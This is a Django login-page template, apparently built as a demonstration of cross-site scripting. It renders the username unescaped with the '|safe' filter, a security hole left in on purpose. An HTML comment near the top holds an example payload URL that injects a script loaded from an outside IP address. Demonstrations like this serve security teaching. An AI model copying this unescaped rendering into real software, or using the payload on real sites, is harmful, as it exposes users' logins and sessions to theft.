<!DOCTYPE html>
{% load static %}
<html>
<!-- http://localhost/name=银卡用户</h4><script src="http://192.168.36.136/static/attack.js"></script><h4> -->
<head>
	<meta charset="utf-8">
	<meta name="author" content="Kodinger">
	<title>XSS漏洞攻击演示</title>
	<link rel="stylesheet" href="{% static './bootstrap.min.css' %}">
	<link rel="stylesheet" href="{% static './my-login.css' %}">
</head>
<body class="my-login-page">
	<section class="h-100">
		<div class="container h-100">
			<div class="row justify-content-md-center h-100">
				<div class="card-wrapper">
					<div class="brand">
						<img src="{% static './logo.jpg' %}">
					</div>
					<div class="card fat">
						<div class="card-body">
							<h4 class="card-title">尊敬的{{ username|safe }}</h4>
							<form method="POST">
							 
								<div class="form-group">
									<label for="email">E-Mail Address</label>

									<input id="email" type="email" class="form-control" name="email" value="" required autofocus>
								</div>

								<div class="form-group">
									<label for="password">Password
										<a href="forgot.html" class="float-right">
											Forgot Password?
										</a>
									</label>
									<input id="password" type="password" class="form-control" name="password" required data-eye>
								</div>

								<div class="form-group">
									<label>
										<input type="checkbox" name="remember"> Remember Me
									</label>
								</div>

								<div class="form-group no-margin">
									<button type="submit" class="btn btn-primary btn-block">
										Login
									</button>
								</div>
								<div class="margin-top20 text-center">
									Don't have an account? <a href="register.html">Create One</a>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<script src="{% static './jquery.min.js' %}"></script>
	<script src="{% static './bootstrap.min.js' %}"></script>
	<script src="{% static './my-login.js' %}"></script>
</body>
</html>
